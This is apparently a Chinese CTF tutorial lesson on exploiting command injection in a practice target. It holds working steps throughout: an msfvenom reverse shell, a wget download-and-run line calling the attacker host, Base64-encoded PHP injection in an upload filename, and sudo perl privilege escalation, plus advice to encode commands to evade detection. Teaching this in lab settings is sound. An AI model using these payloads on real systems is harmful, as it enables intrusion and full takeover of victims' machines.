# 网络安全CTF全套教程：P20：18.20.命令注入2 🔓

在本节课中，我们将继续学习命令注入漏洞的利用。我们将基于上节课发现的漏洞，通过反弹Shell的方式获取靶场机器的控制权，并最终读取Flag值。

---

![](img/92d7e956935b6233d623878aa1e5e87d_1.png)

## 回顾与准备

上一节我们介绍了如何利用`searchsploit`工具发现并验证了目标系统的命令注入漏洞，成功执行了`id`命令。

![](img/92d7e956935b6233d623878aa1e5e87d_3.png)

本节中我们来看看如何利用这个漏洞获取靶场的完整访问权限。核心思路是让靶场机器从我们的攻击机下载一个恶意Shell程序并执行，从而将控制权“反弹”回我们的监听端口。

在进行此操作前，需要完成以下准备工作：
1.  在攻击机上启动Metasploit，监听一个端口，等待反弹回来的Shell连接。
2.  生成一个适用于靶场系统（Linux x86）的恶意Shell程序（Payload）。
3.  启动Web服务器（如Apache），以便靶场机器能下载我们生成的Shell程序。

以下是具体操作步骤。

![](img/92d7e956935b6233d623878aa1e5e87d_5.png)

### 步骤一：启动Metasploit监听

![](img/92d7e956935b6233d623878aa1e5e87d_7.png)

首先，在攻击机（Kali Linux）上打开终端，启动Metasploit框架并设置监听。

![](img/92d7e956935b6233d623878aa1e5e87d_9.png)

![](img/92d7e956935b6233d623878aa1e5e87d_11.png)

```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.106  # 攻击机的IP地址
set LPORT 4444            # 监听的端口
exploit
```

![](img/92d7e956935b6233d623878aa1e5e87d_13.png)

![](img/92d7e956935b6233d623878aa1e5e87d_15.png)

执行以上命令后，Metasploit开始在`192.168.1.106:4444`端口进行监听。

![](img/92d7e956935b6233d623878aa1e5e87d_17.png)

### 步骤二：生成Shell Payload

接下来，我们需要生成一个能被靶场机器下载并执行的Shell程序。使用`msfvenom`工具生成一个ELF格式的Payload。

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=4444 -f elf > /var/www/html/shell
```

这条命令的含义是：
*   `-p linux/x86/meterpreter/reverse_tcp`: 指定Payload类型。
*   `LHOST=192.168.1.106 LPORT=4444`: 指定反弹回连的IP和端口，需与监听设置一致。
*   `-f elf`: 指定输出文件格式为ELF（Linux可执行文件）。
*   `> /var/www/html/shell`: 将生成的Payload保存到Apache的Web根目录下，命名为`shell`。

![](img/92d7e956935b6233d623878aa1e5e87d_19.png)

### 步骤三：启动Apache服务

为了让靶场机器能通过HTTP下载我们生成的`shell`文件，需要确保Apache服务已启动。

![](img/92d7e956935b6233d623878aa1e5e87d_21.png)

![](img/92d7e956935b6233d623878aa1e5e87d_23.png)

```bash
service apache2 start
```

![](img/92d7e956935b6233d623878aa1e5e87d_25.png)

---

![](img/92d7e956935b6233d623878aa1e5e87d_27.png)

![](img/92d7e956935b6233d623878aa1e5e87d_29.png)

## 构造并发送攻击命令

现在，攻击环境已准备就绪。我们需要利用之前发现的命令注入点，让靶场机器依次执行三条命令。为了绕过可能存在的防火墙或安全检测，我们将命令进行Base64编码。

![](img/92d7e956935b6233d623878aa1e5e87d_31.png)

![](img/92d7e956935b6233d623878aa1e5e87d_33.png)

以下是需要让靶场机器执行的命令序列及其编码结果：

1.  **下载Shell文件**：让靶场机器从我们的Web服务器下载`shell`文件到其临时目录。
    *   原始命令：`wget http://192.168.1.106/shell -O /tmp/a`
    *   Base64编码后：`dwdlIGh0dHA6Ly8xOTIuMTY4LjEuMTA2L3NoZWxsIC1PIC90bXAvYQ==`

![](img/92d7e956935b6233d623878aa1e5e87d_35.png)

![](img/92d7e956935b6233d623878aa1e5e87d_36.png)

![](img/92d7e956935b6233d623878aa1e5e87d_38.png)

2.  **赋予执行权限**：给下载的文件赋予可执行权限。
    *   原始命令：`chmod 777 /tmp/a`
    *   Base64编码后：`Y2htb2QgNzc3IC90bXAvYQ==`

3.  **执行Shell文件**：运行该文件，触发反弹Shell。
    *   原始命令：`/tmp/a`
    *   Base64编码后：`L3RtcC9h`

![](img/92d7e956935b6233d623878aa1e5e87d_40.png)

![](img/92d7e956935b6233d623878aa1e5e87d_42.png)

---

## 利用Burp Suite发送攻击

![](img/92d7e956935b6233d623878aa1e5e87d_44.png)

![](img/92d7e956935b6233d623878aa1e5e87d_46.png)

我们将使用Burp Suite拦截文件上传请求，并修改`filename`参数，注入我们编码后的PHP命令执行代码。

![](img/92d7e956935b6233d623878aa1e5e87d_48.png)

![](img/92d7e956935b6233d623878aa1e5e87d_50.png)

攻击的固定格式为：`filename="test.php; system(base64_decode(‘编码后的命令‘)); ?>.png"`

![](img/92d7e956935b6233d623878aa1e5e87d_52.png)

![](img/92d7e956935b6233d623878aa1e5e87d_54.png)

以下是操作流程：

![](img/92d7e956935b6233d623878aa1e5e87d_56.png)

1.  在Burp Suite中开启代理拦截（Proxy -> Intercept is on）。
2.  在靶场网页上传一个文件，触发拦截。
3.  将拦截到的数据包发送到重放模块（Repeater）。
4.  在Repeater中，修改`filename`参数，依次注入三条Base64编码的命令。
    *   第一次注入下载命令：
        ```http
        filename="test.php; system(base64_decode(‘dwdlIGh0dHA6Ly8xOTIuMTY4LjEuMTA2L3NoZWxsIC1PIC90bXAvYQ==‘)); ?>.png"
        ```
    *   第二次注入赋权命令：
        ```http
        filename="test.php; system(base64_decode(‘Y2htb2QgNzc3IC90bXAvYQ==‘)); ?>.png"
        ```
    *   第三次注入执行命令：
        ```http
        filename="test.php; system(base64_decode(‘L3RtcC9h‘)); ?>.png"
        ```
5.  每次修改后，点击“Send”发送请求。

![](img/92d7e956935b6233d623878aa1e5e87d_58.png)

![](img/92d7e956935b6233d623878aa1e5e87d_60.png)

当第三条命令执行成功后，观察之前启动的Metasploit监听窗口，应该会看到成功建立了一个`meterpreter`会话，这表示我们已经获得了靶场机器的一个基础Shell。

![](img/92d7e956935b6233d623878aa1e5e87d_62.png)

---

![](img/92d7e956935b6233d623878aa1e5e87d_64.png)

## 权限提升与获取Flag

![](img/92d7e956935b6233d623878aa1e5e87d_66.png)

在反弹的Shell中，我们通常不是最高权限用户。我们需要进行权限提升（提权）。

![](img/92d7e956935b6233d623878aa1e5e87d_68.png)

![](img/92d7e956935b6233d623878aa1e5e87d_70.png)

1.  **检查当前权限**：在meterpreter会话中，输入`shell`进入系统Shell，然后执行`id`命令查看当前用户。通常显示为`www-data`，并非`root`。
2.  **寻找提权路径**：执行`sudo -l`命令，查看当前用户能以`root`身份运行哪些命令。输出中可能会显示例如`(root) NOPASSWD: /usr/bin/perl`，这意味着我们可以无密码以root身份运行`perl`程序。
3.  **利用Perl提权**：利用这个特性，我们可以通过Perl来启动一个具有root权限的bash shell。
    ```bash
    sudo perl -e ‘exec “/bin/bash”‘
    bash -i
    ```
    执行后，命令提示符变为`#`，表示已获得`root`权限。
4.  **寻找并读取Flag**：Flag文件通常位于根目录或特定用户目录下。
    ```bash
    cd /root
    ls
    cat flag.txt  # 或 flag、flag.php等
    ```
    执行`cat`命令后，屏幕上显示的内容即为本关卡的Flag值。

---

![](img/92d7e956935b6233d623878aa1e5e87d_72.png)

## 课程总结

![](img/92d7e956935b6233d623878aa1e5e87d_74.png)

本节课我们一起学习了命令注入漏洞的完整利用链：
1.  **利用漏洞**：通过修改上传文件的`filename`参数，注入并执行系统命令。
2.  **建立连接**：让靶场机器下载并执行我们生成的恶意Shell程序，建立反向连接。
3.  **权限提升**：利用系统配置弱点（如`sudo`权限配置不当），将普通用户权限提升至`root`权限。
4.  **获取目标**：最终在目标系统上找到并读取Flag文件。

![](img/92d7e956935b6233d623878aa1e5e87d_76.png)

核心要点在于：
*   在渗透测试中，信息收集至关重要，需要根据收集到的信息灵活选择利用方式。
*   对于Web系统，应优先尝试使用现有的公开漏洞利用代码（Exploit），这比挖掘零日漏洞更高效。
*   在实际操作和CTF比赛中，要注意使用编码、混淆等技术绕过安全防护机制。

![](img/92d7e956935b6233d623878aa1e5e87d_78.png)

通过本课的学习，你应该对命令注入漏洞的危害及利用方法有了更深入的理解。